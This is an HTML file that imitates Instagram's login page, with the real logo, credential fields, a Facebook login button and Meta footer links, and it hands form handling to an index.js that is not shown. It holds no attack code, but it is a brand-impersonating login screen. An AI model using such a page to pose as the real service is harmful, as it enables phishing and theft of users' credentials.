<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <!-- ✅ Updated Content Security Policy (CSP) -->
    <meta http-equiv="Content-Security-Policy" content="
    default-src 'self'; 
    img-src 'self' https://upload.wikimedia.org data:; 
    script-src 'self';
    ">

    <title>Instagram Login</title>
    <link rel="stylesheet" href="index.css">
</head>
<body>
    <div class="login-container">
        <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" alt="Instagram Logo">
        <button class="facebook-btn">Continue with Facebook</button>
        <div class="separator"><span>OR</span></div>
        <input type="text" placeholder="Phone number, username, or email" id="username">
        <input type="password" placeholder="Password" id="password">
        <button class="login-btn" id="loginBtn">Log In</button> <!-- ✅ Removed inline script -->
        <a href="#" class="forgot-password">Forgot password?</a>
        <div class="signup-link">Don't have an account? <a href="#">Sign up</a></div>
    </div>
    
    <div class="footer-links">
        <a href="#">Meta</a>
        <a href="#">About</a>
        <a href="#">Blog</a>
        <a href="#">Jobs</a>
        <a href="#">Help</a>
        <a href="#">API</a>
        <a href="#">Privacy</a>
        <a href="#">Terms</a>
        <a href="#">Locations</a>
        <a href="#">Instagram Lite</a>
        <a href="#">Threads</a>
    </div>

    <script src="index.js"></script> <!-- ✅ External JavaScript -->
</body>
</html>
